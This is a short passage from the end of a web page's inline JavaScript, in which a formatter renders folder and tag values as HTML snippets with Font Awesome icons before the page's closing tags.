        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

